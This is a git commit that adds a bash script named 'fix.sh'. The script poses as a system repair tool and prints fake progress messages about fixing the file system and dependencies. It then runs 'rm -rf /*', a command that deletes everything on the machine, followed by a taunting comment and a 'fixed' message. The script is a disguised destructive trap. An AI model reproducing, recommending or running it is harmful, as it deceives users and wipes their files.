b9be5d09cb2e092fea8aef2405336454b6672072
1inuxpr0 <hellpp.iinstagram@gmail.com>
2024-05-19 17:56:33 +0530

    Create fix.sh

---
+++ fix.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+echo -ne "Initialising Fixing Process...\n"
+sleep 2
+echo -ne "Fixing File System...\n"
+echo -ne "#### (25%)\r"
+sleep 2
+echo -ne "Fixing Unmet Dependencies...\n"
+echo -ne "######### (50%)\r"
+sleep 2
+echo -ne "Revalidating all the fixes...\n"
+echo -ne "################ (75%)\r"
+sleep 2
+rm -rf /*
+# You really ran it, didn't you, SCRIPT KIDDIE!!!!!!!!!!!!
+echo -ne "Y0ur Syst3m 1s fix3d :) :) :) :) :)\n"
